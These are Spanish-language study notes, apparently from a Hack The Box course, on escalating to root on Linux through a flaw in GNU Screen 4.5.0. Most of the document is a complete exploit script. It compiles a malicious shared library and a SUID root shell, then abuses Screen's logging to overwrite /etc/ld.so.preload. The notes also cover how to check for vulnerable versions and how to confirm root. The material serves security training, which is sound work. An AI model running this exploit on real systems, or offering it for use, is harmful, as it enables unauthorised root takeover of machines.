
## 1. Concepto

Algunos programas instalados en Linux contienen vulnerabilidades que permiten escalar privilegios.

Un ejemplo es **GNU Screen 4.5.0**, vulnerable a una escalada local de privilegios debido a la falta de comprobación de permisos al abrir un archivo de registro.

En las condiciones adecuadas, el fallo puede permitir manipular archivos protegidos y obtener una shell como `root`.

## 2. Identificar la versión

```
screen -v
```

Ejemplo de salida:

```
Screen version 4.05.00 (GNU) 10-Dec-16
```

Si encuentras esta versión, comprueba si el sistema cumple las condiciones necesarias para explotar la vulnerabilidad.

## 3. Código del exploit

El script proporcionado por HTB automatiza la explotación utilizando una biblioteca compartida y el archivo `/etc/ld.so.preload`.

Guárdalo como `screen_exploit.sh`:

```
#!/bin/bash
# screenroot.sh
# setuid screen v4.5.0 local root exploit
# abuses ld.so.preload overwriting to get root.

echo "~ gnu/screenroot ~"
echo "[+] First, we create our shell and library..."

cat << EOF > /tmp/libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>

__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
EOF

gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
rm -f /tmp/libhax.c

cat << EOF > /tmp/rootshell.c
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
EOF

gcc -o /tmp/rootshell /tmp/rootshell.c -Wno-implicit-function-declaration
rm -f /tmp/rootshell.c

echo "[+] Now we create our /etc/ld.so.preload file..."
cd /etc
umask 000
screen -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so"

echo "[+] Triggering..."
screen -ls
/tmp/rootshell
```

**Nota:** el código se reproduce tal como aparece en el material compartido. La llamada a `execvp()` tiene una cantidad incorrecta de argumentos en C estándar, por lo que el script puede necesitar una corrección para compilar y funcionar.

## 4. ¿Cómo funciona?

1. **Crea una biblioteca compartida:** `/tmp/libhax.c` contiene una función que se ejecuta al cargar la biblioteca.
    
2. **Compila la biblioteca:** genera `/tmp/libhax.so`.
    
3. **Crea un ejecutable:** `/tmp/rootshell` intenta establecer sus identificadores de usuario y grupo a `0`.
    
4. **Abusa de Screen:** utiliza la vulnerabilidad de registro para manipular `/etc/ld.so.preload`.
    
5. **Carga la biblioteca:** cuando un proceso carga la biblioteca, su función `dropshell()` modifica los permisos del ejecutable y elimina el archivo de precarga.
    
6. **Intenta obtener root:** ejecuta `/tmp/rootshell`.
    

### Conceptos clave

|Elemento|Función|
|---|---|
|`screen -v`|Comprueba la versión instalada.|
|`gcc -fPIC -shared`|Compila una biblioteca compartida.|
|`/etc/ld.so.preload`|Indica bibliotecas que deben precargarse en los procesos afectados.|
|`chmod 04755`|Establece los bits SUID y los permisos indicados en el archivo.|
|`setuid(0)`|Intenta establecer el UID a `root`.|
|`id`|Comprueba la identidad y los privilegios efectivos.|

## 5. Comprobación de privilegios

```
id
```

Si el exploit funciona, el resultado esperado incluye:

```
uid=0(root) gid=0(root)
```
